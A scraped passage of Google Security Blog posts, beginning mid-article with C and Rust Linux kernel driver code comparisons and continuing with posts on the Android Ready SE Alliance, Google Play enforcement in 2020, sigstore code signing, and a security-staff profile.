*nodp,                       struct file *filp) {     struct file_state *state = filp->private_data;     [...] }   static const struct file_operations semaphore_fops = {         .owner = THIS_MODULE,         .open = semaphore_open,         .read = semaphore_read,         .write = semaphore_write,         .compat_ioctl = semaphore_ioctl,         .release = semaphore_release, };        Character devices in Rust benefit from a number of safety features:       Per-file state lifetime management: FileOpener::open returns an object whose lifetime is owned by the caller from then on. Any object that implements the PointerWrapper trait can be returned, and we provide implementations for Box  and Arc , so developers that use Rust's idiomatic heap-allocated or reference-counted pointers have no additional requirements.  All associated functions in FileOperations receive non-mutable references to self (more about this below), except the release function, which is the last function to be called and receives the plain object back (and its ownership with it). The release implementation can then defer the object destruction by transferring its ownership elsewhere, or destroy it then; in the case of a reference-counted object, 'destruction' means decrementing the reference count (and actual object destruction if the count goes to zero).  That is, we use Rust's ownership discipline when interacting with C code by handing the C portion ownership of a Rust object, allowing it to call functions implemented in Rust, then eventually giving ownership back. So as long as the C code is correct, the lifetime of Rust file objects work seamlessly as well, with the compiler enforcing correct lifetime management on the Rust side, for example: open cannot return stack-allocated pointers or heap-allocated objects containing pointers to the stack, ioctl/read/write cannot free (or modify without synchronization) the contents of the object stored in filp->private_data, etc.           Non-mutable references: the associated functions called between open and release all receive non-mutable references to self because they can be called concurrently by multiple threads and Rust aliasing rules prohibit more than one mutable reference to an object at any given time.  If a developer needs to modify some state (and they generally do), they can do so via interior mutability: mutable state can be wrapped in a Mutex  or SpinLock  (or atomics) and safely modified through them.  This prevents, at compile-time, bugs where a developer fails to acquire the appropriate lock when accessing a field (the field is inaccessible), or when a developer fails to wrap a field with a lock (the field is read-only).              Per-device state: when file instances need to share per-device state, which is a very common occurrence in drivers, they can do so safely in Rust. When a device is registered, a typed object can be provided and a non-mutable reference to it is provided when FileOperation::open is called. In our example, the shared object is wrapped in Arc , so files can safely clone and hold on to a reference to them.  The reason FileOperation is its own trait (as opposed to, for example, open being part of the FileOperations trait) is to allow a single file implementation to be registered in different ways.  This eliminates opportunities for developers to get the wrong data when trying to retrieve shared state. For example, in C when a miscdevice is registered, a pointer to it is available in filp->private_data; when a cdev is registered, a pointer to it is available in inode->i_cdev. These structs are usually embedded in an outer struct that contains the shared state, so developers usually use the container_of macro to recover the shared state. Rust encapsulates all of this and the potentially troublesome pointer casts in a safe abstraction.                  Static typing: we take advantage of Rust's support for generics to implement all of the above functions and types with static types. So there are no opportunities for a developer to convert an untyped variable or field to the wrong type. The C code in the table above has casts from an essentially untyped (void *) pointer to the desired type at the start of each function: this is likely to work fine when first written, but may lead to bugs as the code evolves and assumptions change. Rust would catch any such mistakes at compile time.              File operations: as we mentioned before, a developer needs to implement the FileOperations trait to customize the behavior of their device. They do this with a block starting with impl FileOperations for Device, where Device is the type implementing the file behavior (FileState in our example). Once inside this block, tools know that only a limited number of functions can be defined, so they can automatically insert the prototypes. (Personally, I use neovim and the rust-analyzer LSP server.) While we use this trait in Rust, the C portion of the kernel still requires an instance of struct file_operations. The kernel crate automatically generates one from the trait implementation (and optionally the declare_file_operations macro): although it has code to generate the correct struct, it is all const, so evaluated at compile-time with zero runtime cost.       Ioctl handling    For a driver to provide a custom ioctl handler, it needs to implement the ioctl function that is part of the FileOperations trait, as exemplified in the table below.        fn ioctl(     &self,     file: &File,     cmd: &mut IoctlCommand ) -> KernelResult  {     cmd.dispatch(self, file) }   impl IoctlHandler for FileState {     fn read(         &self,         _file: &File,         cmd: u32,         writer: &mut UserSlicePtrWriter     ) -> KernelResult  {         match cmd {             IOCTL_GET_READ_COUNT => {                 writer.write(                     &self                     .read_count                     .load(Ordering::Relaxed))?;                 Ok(0)             }             _ => Err(Error::EINVAL),         }     }       fn write(         &self,         _file: &File,         cmd: u32,         reader: &mut UserSlicePtrReader     ) -> KernelResult  {         match cmd {             IOCTL_SET_READ_COUNT => {                 self                 .read_count                 .store(reader.read()?,                        Ordering::Relaxed);                 Ok(0)             }             _ => Err(Error::EINVAL),         }     } }      #define IOCTL_GET_READ_COUNT _IOR('c', 1, u64) #define IOCTL_SET_READ_COUNT _IOW('c', 1, u64)   static long semaphore_ioctl(struct file *filp,                      unsigned int cmd,                      unsigned long arg) {     struct file_state *state = filp->private_data;     void __user *buffer = (void __user *)arg;     u64 value;       switch (cmd) {     case IOCTL_GET_READ_COUNT:         value = atomic64_read(&state->read_count);         if (copy_to_user(buffer, &value, sizeof(value)))             return -EFAULT;         return 0;     case IOCTL_SET_READ_COUNT:         if (copy_from_user(&value, buffer, sizeof(value)))             return -EFAULT;         atomic64_set(&state->read_count, value);         return 0;     default:         return -EINVAL;     } }          Ioctl commands are standardized such that, given a command, we know whether a user buffer is provided, its intended use (read, write, both, none), and its size. In Rust, we provide a dispatcher (accessible by calling cmd.dispatch) that uses this information to automatically create user memory access helpers and pass them to the caller.     A driver is not required to use this though. If, for example, it doesn't use the standard ioctl encoding, Rust offers the flexibility of simply calling cmd.raw to extract the raw arguments and using them to handle the ioctl (potentially with unsafe code, which will need to be justified).     However, if a driver implementation does use the standard dispatcher, it will benefit from not having to implement any unsafe code, and:       The pointer to user memory is never a native pointer, so the developer cannot accidentally dereference it.    The types that allow the driver to read from user space only allow data to be read once, so we eliminate the risk of time-of-check to time-of-use (TOCTOU) bugs because when a driver needs to access data twice, it needs to copy it to kernel memory, where an attacker is not allowed to modify it. Excluding unsafe blocks, there is no way to introduce this class of bugs in Rust.    No accidental overflow of the user buffer: we'll never read or write past the end of the user buffer because this is enforced automatically based on the size encoded in the ioctl command. In our example above, the implementation of IOCTL_GET_READ_COUNT only has access to an instance of UserSlicePtrWriter, which limits the number of writable bytes to sizeof(u64) as encoded in the ioctl command.    No mixing of reads and writes: we'll never write buffers for ioctls that are only meant to read and never read buffers for ioctls that are only meant to write. This is enforced by read and write handlers only getting instances of UserSlicePtrWriter and UserSlicePtrReader respectively.      All of the above could potentially also be done in C, but it's very easy for developers to (likely unintentionally) break contracts that lead to unsafety; Rust requires unsafe blocks for this, which should only be used in rare cases and brings additional scrutiny. Additionally, Rust offers the following:       The types used to read and write user memory do not implement the Send and Sync traits, which means that they (and pointers to them) are not safe to be used in another thread context. In Rust, if a driver developer attempted to write code that passed one of these objects to another thread (where it wouldn't be safe to use them because it isn't necessarily in the right memory manager context), they would get a compilation error.   When calling IoctlCommand::dispatch, one might understandably think that we need dynamic dispatching to reach the actual handler implementation (which would incur additional cost in comparison to C), but we don't. Our usage of generics will lead the compiler to monomorphize the function, which will result in static function calls that can even be inlined if the optimizer so chooses.       Locking and condition variables    We allow developers to use mutexes and spinlocks to provide interior mutability. In our example, we use a mutex to protect mutable data; in the tables below we show the data structures we use in C and Rust, and how we implement a wait until the count is nonzero so that we can satisfy a read:          struct SemaphoreInner {     count: usize,     max_seen: usize, }   struct Semaphore {     changed: CondVar,     inner: Mutex , }   struct FileState {     read_count: AtomicU64,     shared: Arc , }   struct semaphore_state {     struct kref ref;     struct miscdevice miscdev;     wait_queue_head_t changed;     struct mutex mutex;     size_t count;     size_t max_seen; };   struct file_state {     atomic64_t read_count;     struct semaphore_state *shared; };                                           fn consume(&self) -> KernelResult {     let mut inner = self.shared.inner.lock();     while inner.count == 0 {         if self.shared.changed.wait(&mut inner) {             return Err(Error::EINTR);         }     }     inner.count -= 1;     Ok(()) }   static int semaphore_consume(     struct semaphore_state *state) {     DEFINE_WAIT(wait);       mutex_lock(&state->mutex);     while (state->count == 0) {         prepare_to_wait(&state->changed, &wait,                         TASK_INTERRUPTIBLE);         mutex_unlock(&state->mutex);         schedule();         finish_wait(&state->changed, &wait);         if (signal_pending(current))             return -EINTR;         mutex_lock(&state->mutex);     }       state->count--;     mutex_unlock(&state->mutex);       return 0; }      We note that such waits are not uncommon in the existing C code, for example, a pipe waiting for a \"partner\" to write, a unix-domain socket waiting for data, an inode search waiting for completion of a delete, or a user-mode helper waiting for state change.    The following are benefits from the Rust implementation:         The Semaphore::inner field is only accessible when the lock is held, through the guard returned by the lock function. So developers cannot accidentally read or write protected data without locking it first. In the C example above, count and max_seen in semaphore_state are protected by mutex, but there is no enforcement that the lock is held while they're accessed.    Resource Acquisition Is Initialization (RAII): the lock is unlocked automatically when the guard (inner in this case) goes out of scope. This ensures that locks are always unlocked: if the developer needs to keep a lock locked, they can keep the guard alive, for example, by returning the guard itself; conversely, if they need to unlock before the end of the scope, they can explicitly do it by calling the drop function.    Developers can use any lock that implements the Lock trait, which includes Mutex and SpinLock, at no additional runtime cost when compared to a C implementation. Other synchronization constructs, including condition variables, also work transparently and with zero additional run-time cost.    Rust implements condition variables using kernel wait queues. This allows developers to benefit from atomic release of the lock and putting the thread to sleep without having to reason about low-level kernel scheduler functions. In the C example above, semaphore_consume is a mix of semaphore logic and subtle Linux scheduling: for example, the code is incorrect if mutex_unlock is called before prepare_to_wait because it may result in a wake up being missed.    No unsynchronized access: as we mentioned before, variables shared by multiple threads/CPUs must be read-only, with interior mutability being the solution for cases when mutability is needed. In addition to the example with locks above, the ioctl example in the previous section also has an example of using an atomic variable; Rust also requires developers to specify how memory is to be synchronized by atomic accesses. In the C part of the example, we happen to use atomic64_t, but the compiler won't alert a developer to this need.       Error handling and control flow    In the tables below, we show how open, read, and write are implemented in our example driver:        fn read(     &self,     _: &File,     data: &mut UserSlicePtrWriter,     offset: u64 ) -> KernelResult  {    if data.is_empty() || offset > 0 {         return Ok(0);     }       self.consume()?;     data.write_slice(&[0u8; 1])?;     self.read_count.fetch_add(1, Ordering::Relaxed);     Ok(1) }           static ssize_t semaphore_read(struct file *filp,                        char __user *buffer,                        size_t count, loff_t *ppos) {     struct file_state *state = filp->private_data;     char c = 0;     int ret;       if (count == 0 || *ppos > 0)         return 0;       ret = semaphore_consume(state->shared);     if (ret)         return ret;       if (copy_to_user(buffer, &c, sizeof(c)))         return -EFAULT;       atomic64_add(1, &state->read_count);     *ppos += 1;     return 1; }                                                    fn write(     &self,     data: &mut UserSlicePtrReader,     _offset: u64 ) -> KernelResult  {    {         let mut inner = self.shared.inner.lock();         inner.count = inner.count.saturating_add(data.len());         if inner.count > inner.max_seen {             inner.max_seen = inner.count;         }     }       self.shared.changed.notify_all();     Ok(data.len()) }   static ssize_t semaphore_write(struct file *filp,                         const char __user *buffer,                         size_t count, loff_t *ppos) {     struct file_state *state = filp->private_data;     struct semaphore_state *shared = state->shared;       mutex_lock(&shared->mutex);     shared->count += count;     if (shared->count < count)         shared->count = SIZE_MAX;       if (shared->count > shared->max_seen)         shared->max_seen = shared->count;       mutex_unlock(&shared->mutex);       wake_up_all(&shared->changed);     return count; }                                              fn open(     shared: &Arc  ) -> KernelResult > {     Ok(Box::try_new(Self {         read_count: AtomicU64::new(0),         shared: shared.clone(),     })?) }   static  int semaphore_open(struct inode *nodp,                    struct file *filp) {     struct semaphore_state *shared =         container_of(filp->private_data,                      struct semaphore_state,                      miscdev);     struct file_state *state;       state = kzalloc(sizeof(*state), GFP_KERNEL);     if (!state)         return -ENOMEM;       kref_get(&shared->ref);     state->shared = shared;     atomic64_set(&state->read_count, 0);       filp->private_data = state;       return 0; }      They illustrate other benefits brought by Rust:       The ? operator: it is used by the Rust open and read implementations to do error handling implicitly; the developer can focus on the semaphore logic, the resulting code being quite small and readable. The C versions have error-handling noise that can make them less readable.    Required initialization: Rust requires all fields of a struct to be initialized on construction, so the developer can never accidentally fail to initialize a field; C offers no such facility. In our open example above, the developer of the C version could easily fail to call kref_get (even though all fields would have been initialized); in Rust, the user is required to call clone (which increments the ref count), otherwise they get a compilation error.    RAII scoping: the Rust write implementation uses a statement block to control when inner goes out of scope and therefore the lock is released.    Integer overflow behavior: Rust encourages developers to always consider how overflows should be handled. In our write example, we want a saturating one so that we don't end up with a zero value when adding to our semaphore. In C, we need to manually check for overflows, there is no additional support from the compiler.     What's next    The examples above are only a small part of the whole project. We hope it gives readers a glimpse of the kinds of benefits that Rust brings. At the moment we have nearly all generic kernel functionality needed by Binder neatly wrapped in safe Rust abstractions, so we are in the process of gathering feedback from the broader Linux kernel community with the intent of upstreaming the existing Rust support.     We also continue to make progress on our Binder prototype, implement additional abstractions, and smooth out some rough edges. This is an exciting time and a rare opportunity to potentially influence how the Linux kernel is developed, as well as inform the evolution of the Rust language. We invite those interested to join us in Rust for Linux and attend our planned talk at Linux Plumbers Conference 2021!     Thanks Nick Desaulniers, Kees Cook, and Adrian Taylor for contributions to this post. Special thanks to Jeff Vander Stoep for contributions and editing, and to Greg Kroah-Hartman for reviewing and contributing to the code examples.      ", "date": "April 14, 2021"},
{"website": "Google-Security", "title": "\nAnnouncing the Android Ready SE Alliance\n", "author": ["Posted by Sudhi Herle and Jason Wong, Android Team"], "link": "https://security.googleblog.com/2021/03/announcing-android-ready-se-alliance.html", "abstract": "                             Posted by Sudhi Herle and Jason Wong, Android Team     When the Pixel 3 launched in 2018, it had a  new tamper-resistant hardware enclave  called  Titan M . In addition to being a root-of-trust for Pixel software and firmware, it also enabled tamper-resistant key storage for Android Apps using  StrongBox . StrongBox is an implementation of the Keymaster HAL that resides in a hardware security module. It is an important security enhancement for Android devices and paved the way for us to consider features that were previously not possible.     StrongBox and tamper-resistant hardware are becoming important requirements for emerging user features, including:       Digital keys (car, home, office)   Mobile Driver&#8217;s License (mDL), National ID, ePassports   eMoney solutions (for example, Wallet)       All these features need to run on tamper-resistant hardware to protect the integrity of the application executables and a user&#8217;s data, keys, wallet, and more. Most modern phones now include discrete tamper-resistant hardware called a Secure Element (SE). We believe this SE offers the best path for introducing these new consumer use cases in Android.     In order to accelerate adoption of these new Android use cases, we are announcing the formation of the  Android Ready SE Alliance . SE vendors are joining hands with Google to create a set of open-source, validated, and ready-to-use SE Applets. Today, we are launching the General Availability (GA) version of StrongBox for SE. This applet is qualified and ready for use by our OEM partners. It is currently available from  Giesecke+Devrient ,  Kigen ,  NXP ,  STMicroelectronics , and  Thales .     It is important to note that these features are not just for phones and tablets. StrongBox is also applicable to WearOS, Android Auto Embedded, and Android TV.      Using Android Ready SE in a device requires the OEM to:       Pick the appropriate, validated hardware part from their SE vendor   Enable SE to be initialized from the bootloader and provision the root-of-trust (RoT) parameters through the SPI interface or cryptographic binding   Work with Google to provision Attestation Keys/Certificates in the SE factory   Use the GA version of the StrongBox for the SE applet, adapted to your SE   Integrate HAL code   Enable an SE upgrade mechanism   Run CTS/VTS tests for StrongBox to verify that the integration is done correctly       We are working with our ecosystem to prioritize and deliver the following Applets in conjunction with corresponding Android feature releases:       Mobile driver&#8217;s license and Identity Credentials   Digital car keys       We already have several Android OEMs adopting  Android Ready SE  for their devices. We look forward to working with our OEM partners to bring these next generation features for our users.     Please visit our Android Security and Privacy developer  site  for more info.                                      Posted by Sudhi Herle and Jason Wong, Android Team   When the Pixel 3 launched in 2018, it had a new tamper-resistant hardware enclave called Titan M. In addition to being a root-of-trust for Pixel software and firmware, it also enabled tamper-resistant key storage for Android Apps using StrongBox. StrongBox is an implementation of the Keymaster HAL that resides in a hardware security module. It is an important security enhancement for Android devices and paved the way for us to consider features that were previously not possible.   StrongBox and tamper-resistant hardware are becoming important requirements for emerging user features, including:    Digital keys (car, home, office)  Mobile Driver’s License (mDL), National ID, ePassports  eMoney solutions (for example, Wallet)    All these features need to run on tamper-resistant hardware to protect the integrity of the application executables and a user’s data, keys, wallet, and more. Most modern phones now include discrete tamper-resistant hardware called a Secure Element (SE). We believe this SE offers the best path for introducing these new consumer use cases in Android.   In order to accelerate adoption of these new Android use cases, we are announcing the formation of the Android Ready SE Alliance. SE vendors are joining hands with Google to create a set of open-source, validated, and ready-to-use SE Applets. Today, we are launching the General Availability (GA) version of StrongBox for SE. This applet is qualified and ready for use by our OEM partners. It is currently available from Giesecke+Devrient, Kigen, NXP, STMicroelectronics, and Thales.   It is important to note that these features are not just for phones and tablets. StrongBox is also applicable to WearOS, Android Auto Embedded, and Android TV.    Using Android Ready SE in a device requires the OEM to:    Pick the appropriate, validated hardware part from their SE vendor  Enable SE to be initialized from the bootloader and provision the root-of-trust (RoT) parameters through the SPI interface or cryptographic binding  Work with Google to provision Attestation Keys/Certificates in the SE factory  Use the GA version of the StrongBox for the SE applet, adapted to your SE  Integrate HAL code  Enable an SE upgrade mechanism  Run CTS/VTS tests for StrongBox to verify that the integration is done correctly    We are working with our ecosystem to prioritize and deliver the following Applets in conjunction with corresponding Android feature releases:    Mobile driver’s license and Identity Credentials  Digital car keys    We already have several Android OEMs adopting Android Ready SE for their devices. We look forward to working with our OEM partners to bring these next generation features for our users.   Please visit our Android Security and Privacy developer site for more info.       ", "date": "March 25, 2021"},
{"website": "Google-Security", "title": "\nHow we fought bad apps and developers in 2020\n", "author": ["Posted by Krish Vitaldevara, Director of Product Management Trust & Safety, Google Play"], "link": "https://security.googleblog.com/2021/04/how-we-fought-bad-apps-and-developers.html", "abstract": "                             Posted by Krish Vitaldevara, Director of Product Management Trust & Safety, Google Play          Providing safe experiences to billions of users and millions of Android developers has been one of the highest priorities for Google Play for many years. Last year we introduced new policies, improved our systems, and further optimized our processes to better protect our users, assist good developers and strengthen our guard against bad apps and developers. Additionally, in 2020, Google Play Protect scanned over 100B installed apps each day for malware across billions of devices.     Users come to Google Play to find helpful, reliable apps on everything from COVID-19 vaccine information to new forms of entertainment, grocery delivery, communication and more.     As such, we introduced a series of policies and new developer support to continue to elevate  information quality on the platform and reduce the risk of user harm from misinformation.        COVID-19 apps requirements:  To ensure public safety, information integrity and privacy, we introduced  specific requirements  for COVID-19 apps. Under these requirements, apps related to sensitive use cases, such as those providing testing information, must be endorsed by either official governmental entities or healthcare organizations and must meet a high standard for user data privacy.     News policy:  To promote transparency in news publishing, we  introduced  minimum requirements that apps must meet in order for developers to declare their app as a &#8220;News&#8221; app  on Google Play. These  guidelines  help promote user transparency and developer accountability by providing users with relevant information about the app.     Election support:  We created  teams  and processes across Google Play focused on elections to provide additional support and adapt to the changing landscape. This includes support for government agencies, specially trained app reviewers, and a safety team to address election threats and abuse.        Our core efforts around identifying and mitigating bad apps and developers continued to evolve to address new adversarial behaviors and forms of abuse. Our machine-learning detection capabilities and enhanced app review processes prevented over 962k policy-violating app submissions from getting published to Google Play. We also banned 119k malicious and spammy developer accounts. Additionally, we significantly increased our focus on SDK enforcement, as we've found these violations have an outsized impact on security and user data privacy.     Last year, we continued to reduce developer access to sensitive permissions. In February, we  announced  a new background location policy to ensure that apps requesting this permission need the data in order to provide clear user benefit. As a result of the new policy, developers now have to demonstrate that benefit and prominently tell users about it or face possible removal from Google Play. We've begun enforcement on apps not meeting new policy guidelines and will provide an update on the usage of this permission in a future blog post.      We've also continued to invest in protecting kids and helping parents find great content. In 2020 we  launched  a new kids tab filled with &#8220;Teacher approved&#8221; apps. To evaluate apps, we teamed with academic experts and teachers across the country, including our lead advisors, Joe Blatt (Harvard Graduate School of Education) and Dr. Sandra Calvert (Georgetown University).     As we continue to invest in protecting people from apps with harmful content, malicious behaviors, or threats to user privacy, we are also equally motivated to  provide trusted experiences to Play developers . For example, we&#8217;ve improved our process for providing relevant information about enforcement actions we&#8217;ve taken, resulting in significant reduction in appeals and increased developer satisfaction. We will continue to enhance the speed and quality of our communications to developers, and continue listening to feedback about how we can further engage and elevate trusted developers. Android developers can expect to see more on this front in the coming year.      Our global teams of product managers, engineers, policy experts, and operations leaders are more excited than ever to advance the safety of the platform and forge a sustaining trust with our users. We look forward to building an even better Google Play experience.                                     Posted by Krish Vitaldevara, Director of Product Management Trust & Safety, Google Play   Providing safe experiences to billions of users and millions of Android developers has been one of the highest priorities for Google Play for many years. Last year we introduced new policies, improved our systems, and further optimized our processes to better protect our users, assist good developers and strengthen our guard against bad apps and developers. Additionally, in 2020, Google Play Protect scanned over 100B installed apps each day for malware across billions of devices.   Users come to Google Play to find helpful, reliable apps on everything from COVID-19 vaccine information to new forms of entertainment, grocery delivery, communication and more.   As such, we introduced a series of policies and new developer support to continue to elevate  information quality on the platform and reduce the risk of user harm from misinformation.    COVID-19 apps requirements: To ensure public safety, information integrity and privacy, we introduced specific requirements for COVID-19 apps. Under these requirements, apps related to sensitive use cases, such as those providing testing information, must be endorsed by either official governmental entities or healthcare organizations and must meet a high standard for user data privacy.   News policy: To promote transparency in news publishing, we introduced minimum requirements that apps must meet in order for developers to declare their app as a “News” app  on Google Play. These guidelines help promote user transparency and developer accountability by providing users with relevant information about the app.   Election support: We created teams and processes across Google Play focused on elections to provide additional support and adapt to the changing landscape. This includes support for government agencies, specially trained app reviewers, and a safety team to address election threats and abuse.     Our core efforts around identifying and mitigating bad apps and developers continued to evolve to address new adversarial behaviors and forms of abuse. Our machine-learning detection capabilities and enhanced app review processes prevented over 962k policy-violating app submissions from getting published to Google Play. We also banned 119k malicious and spammy developer accounts. Additionally, we significantly increased our focus on SDK enforcement, as we've found these violations have an outsized impact on security and user data privacy.   Last year, we continued to reduce developer access to sensitive permissions. In February, we announced a new background location policy to ensure that apps requesting this permission need the data in order to provide clear user benefit. As a result of the new policy, developers now have to demonstrate that benefit and prominently tell users about it or face possible removal from Google Play. We've begun enforcement on apps not meeting new policy guidelines and will provide an update on the usage of this permission in a future blog post.    We've also continued to invest in protecting kids and helping parents find great content. In 2020 we launched a new kids tab filled with “Teacher approved” apps. To evaluate apps, we teamed with academic experts and teachers across the country, including our lead advisors, Joe Blatt (Harvard Graduate School of Education) and Dr. Sandra Calvert (Georgetown University).   As we continue to invest in protecting people from apps with harmful content, malicious behaviors, or threats to user privacy, we are also equally motivated to provide trusted experiences to Play developers. For example, we’ve improved our process for providing relevant information about enforcement actions we’ve taken, resulting in significant reduction in appeals and increased developer satisfaction. We will continue to enhance the speed and quality of our communications to developers, and continue listening to feedback about how we can further engage and elevate trusted developers. Android developers can expect to see more on this front in the coming year.    Our global teams of product managers, engineers, policy experts, and operations leaders are more excited than ever to advance the safety of the platform and forge a sustaining trust with our users. We look forward to building an even better Google Play experience.      ", "date": "April 21, 2021"},
{"website": "Google-Security", "title": "\nIntroducing sigstore: Easy Code Signing & Verification for Supply Chain Integrity\n", "author": ["Posted by Kim Lewandowski & Dan Lorenc, Google Open Source Security Team"], "link": "https://security.googleblog.com/2021/03/introducing-sigstore-easy-code-signing.html", "abstract": "                             Posted by&nbsp;Kim Lewandowski &amp; Dan Lorenc, Google Open Source Security Team   One of the fundamental security issues with open source is that it&#8217;s difficult to know where the software comes from or how it was built, making it susceptible to supply chain attacks. A few recent examples of  this include  dependency confusion attack  and  malicious RubyGems package  to steal cryptocurrency.   Today we welcome the announcement of  sigstore , a new project in the  Linux Foundation  that aims to solve this issue by improving software supply chain integrity and verification.   Installing most open source software today is equivalent to picking up a random thumb-drive off the sidewalk and plugging it into your machine. To address this we need to make it possible to verify the provenance of all software - including open source packages. We talked about the importance of this in our recent  Know, Prevent, Fix  post.    The mission of sigstore is to make it easy for developers to sign releases and for users to verify them. You can think of it like  Let&#8217;s Encrypt  for Code Signing. Just like how Let&#8217;s Encrypt provides free certificates and automation tooling for HTTPS, sigstore provides free certificates and tooling to automate and verify signatures of source code. Sigstore also has the added benefit of being backed by transparency logs, which means that all the certificates and attestations are globally visible, discoverable and auditable.  Sigstore is designed with open source maintainers, for open source maintainers. We understand long-term key management is hard, so we've taken a unique approach of issuing short-lived certificates based on OpenID Connect grants. Sigstore also stores all activity in Transparency Logs, backed by  Trillian  so that we can more easily detect compromises and recover from them when they do occur. Key distribution is notoriously difficult, so we've designed away the need for them by building a special Root CA just for code signing, which will be made available for free.  We have a working prototype and proof of concepts that we're excited to share for feedback. Our goal is to make it seamless and easy to sign and verify code:             It has been fun collaborating with the folks from  Red Hat  and the open source community on this project. Luke Hinds, one of the lead developers on sigstore and Security Engineering Lead at Red Hat says, \"I am very excited about sigstore and what this means for improving the security of software supply chains. sigstore is an excellent example of an open source community coming together to collaborate and develop a solution to ease the adoption of software signing in a transparent manner.\" We couldn&#8217;t agree more.  Mike Malone, the CEO of  Smallstep , helped with the overall design of sigstore. He adds, &#8220;In less than a generation, open source has grown from a niche community to a critical ecosystem that powers our global economy and institutions of society and culture. We must ensure the security of this ecosystem without undermining the open, decentralized collaboration that makes it work. By building on a clever composition of existing technologies that respect privacy and work at scale, sigstore is the core infrastructure we need to solve this fundamental problem. It&#8217;s an ambitious project with potential for global impact. I&#8217;m impressed by the rapid progress that&#8217;s been made by Google, Red Hat, and Linux Foundation over the past few months, and I&#8217;m excited to hear feedback from the broader community.&#8221;  While we are happy with the progress that has been made, we know there is still work to be done before this can be widely relied upon. Upcoming plans for sigstore include: hardening the system, adding support for other OpenID Connect providers, updating documentation and responding to community feedback.   Sigstore is in its early days, but we're really excited about its future. Now is a great time to  provide feedback , try out the tooling and get involved with the  project  as design details are still being refined.                                     Posted by Kim Lewandowski & Dan Lorenc, Google Open Source Security TeamOne of the fundamental security issues with open source is that it’s difficult to know where the software comes from or how it was built, making it susceptible to supply chain attacks. A few recent examples of  this include dependency confusion attack and malicious RubyGems package to steal cryptocurrency. Today we welcome the announcement of sigstore, a new project in the Linux Foundation that aims to solve this issue by improving software supply chain integrity and verification. Installing most open source software today is equivalent to picking up a random thumb-drive off the sidewalk and plugging it into your machine. To address this we need to make it possible to verify the provenance of all software - including open source packages. We talked about the importance of this in our recent Know, Prevent, Fix post. The mission of sigstore is to make it easy for developers to sign releases and for users to verify them. You can think of it like Let’s Encrypt for Code Signing. Just like how Let’s Encrypt provides free certificates and automation tooling for HTTPS, sigstore provides free certificates and tooling to automate and verify signatures of source code. Sigstore also has the added benefit of being backed by transparency logs, which means that all the certificates and attestations are globally visible, discoverable and auditable.Sigstore is designed with open source maintainers, for open source maintainers. We understand long-term key management is hard, so we've taken a unique approach of issuing short-lived certificates based on OpenID Connect grants. Sigstore also stores all activity in Transparency Logs, backed by Trillian so that we can more easily detect compromises and recover from them when they do occur. Key distribution is notoriously difficult, so we've designed away the need for them by building a special Root CA just for code signing, which will be made available for free.We have a working prototype and proof of concepts that we're excited to share for feedback. Our goal is to make it seamless and easy to sign and verify code:It has been fun collaborating with the folks from Red Hat and the open source community on this project. Luke Hinds, one of the lead developers on sigstore and Security Engineering Lead at Red Hat says, \"I am very excited about sigstore and what this means for improving the security of software supply chains. sigstore is an excellent example of an open source community coming together to collaborate and develop a solution to ease the adoption of software signing in a transparent manner.\" We couldn’t agree more.Mike Malone, the CEO of Smallstep, helped with the overall design of sigstore. He adds, “In less than a generation, open source has grown from a niche community to a critical ecosystem that powers our global economy and institutions of society and culture. We must ensure the security of this ecosystem without undermining the open, decentralized collaboration that makes it work. By building on a clever composition of existing technologies that respect privacy and work at scale, sigstore is the core infrastructure we need to solve this fundamental problem. It’s an ambitious project with potential for global impact. I’m impressed by the rapid progress that’s been made by Google, Red Hat, and Linux Foundation over the past few months, and I’m excited to hear feedback from the broader community.”While we are happy with the progress that has been made, we know there is still work to be done before this can be widely relied upon. Upcoming plans for sigstore include: hardening the system, adding support for other OpenID Connect providers, updating documentation and responding to community feedback. Sigstore is in its early days, but we're really excited about its future. Now is a great time to provide feedback, try out the tooling and get involved with the project as design details are still being refined.     ", "date": "March 9, 2021"},
{"website": "Google-Security", "title": "\n#ShareTheMicInCyber: Brooke Pearson \n", "author": ["Posted by Parisa Tabriz, Head of Chrome Product, Engineering and UX "], "link": "https://security.googleblog.com/2021/03/sharethemicincyber-brooke-pearson.html", "abstract": "                             Posted by Parisa Tabriz, Head of Chrome Product, Engineering and UX&nbsp;        In an effort to showcase the breadth and depth of Black+ contributions to security and privacy fields, we&#8217;ve launched a  profile series  that aims to elevate and celebrate the Black+ voices in security and privacy we have here at Google.                 Brooke Pearson manages the Privacy Sandbox program at Google, and her team's mission is to, &#8220;Create a thriving web ecosystem that is respectful of users and private by default.&#8221; Brooke lives this mission and it is what makes her an invaluable asset to the Chrome team and Google.&nbsp;     In addition to her work advancing the fields of security and privacy, she is a fierce advocate for women in the workplace and for elevating the voices of her fellow Black+ practitioners in security and privacy. She has participated and supported the  #ShareTheMicInCyber  campaign since its inception.   Brooke is passionate about delivering privacy solutions that work and making browsing the web an inherently more private experience for users around the world.              Why do you work in security or privacy?    I work in security and privacy to protect people and their personal information. It&#8217;s that simple. Security and privacy are two issues that are core to shaping the future of technology and how we interact with each other over the Internet. The challenges are immense, and yet the ability to impact positive change is what drew me to the field.   Tell us a little bit about your career journey to Google   My career journey into privacy does not involve traditional educational training in the field. In fact, my background is in public policy and communications, but when I transitioned to the technology industry, I realized that the most pressing policy issues for companies like Google surround the nascent field of privacy and the growing field of security.  After I graduated from college at Azusa Pacific University, I was the recipient of a Fulbright scholarship to Macau, where I spent one year studying Chinese and teaching English. I then moved to Washington D.C. where I initially worked for the State Department while finishing my graduate degree in International Public Policy at George Washington University. I had an amazing experience in that role and it afforded me some incredible networking opportunities and the chance to travel the world, as I worked in Afghanistan and Central Asia.   After about five years in the public sector,  I joined Facebook as a Program Manager for the Global Public Policy team, initially focused on social good programs like Safety Check and Charitable Giving. Over time, I could see that the security team at Facebook was focused on fighting the proliferation of misinformation, and this called to me as an area where I could put my expertise in communication and geopolitical policy to work. So I switched teams and I've been in the security and privacy field ever since, eventually for Uber and now with Google's Chrome team.   At Google, privacy and security are at the heart of everything we do.&nbsp;Chrome is tackling some of the world's biggest security and privacy problems, and everyday my work impacts billions of people around the world. Most days, that's pretty daunting, but every day it's humbling and inspiring.   What is your security or privacy \"soapbox\"?    If we want to encourage people to engage in more secure behavior, we have to make it easy to understand and easy to act on. Every day we strive to make our users safer with Google by implementing security and privacy controls that are effective and easy for our users to use and understand.  As a program manager, I&#8217;ve learned that it is almost always more effective to offer a carrot than a stick, when it comes to security and privacy hygiene.  I encourage all of our users to visit our  Safety Center  to learn all the ways Google helps you stay safe online, every day.  If you are interested in following Brooke&#8217;s work here at Google and beyond, please follow her on Twitter  @brookelenet . We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your 